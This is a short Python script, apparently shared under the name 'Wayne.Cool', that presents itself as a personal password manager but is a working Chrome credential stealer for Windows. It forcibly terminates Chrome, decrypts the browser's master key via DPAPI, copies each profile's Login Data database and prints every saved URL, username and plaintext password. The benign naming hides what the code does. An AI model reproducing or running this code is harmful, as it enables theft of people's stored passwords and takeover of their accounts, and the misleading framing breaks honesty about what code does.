# Wayne.Cool - Password Manager Code for Password Extraction

import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import psutil

def terminate_chrome_processes():
    # Iterate through all running processes
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == 'chrome.exe':
            try:
                # Terminate the Chrome process
                proc = psutil.Process(process.info['pid'])
                proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

terminate_chrome_processes()

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def personal_password_manager():
    try:
        # Get secret key
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

        # Decrypt password function 
        def decrypt_password(ciphertext):
            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_password).decode()

        # Get folders with profiles
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]

        for folder in folders:
            chrome_db_path = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            shutil.copy2(chrome_db_path, "Loginvault.db")
            with sqlite3.connect("Loginvault.db") as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext)
                        print(f"Sequence: {index}")
                        print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n")
                        print("*" * 50)
            
            os.remove("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {e}")

if __name__ == '__main__':
    personal_password_manager()
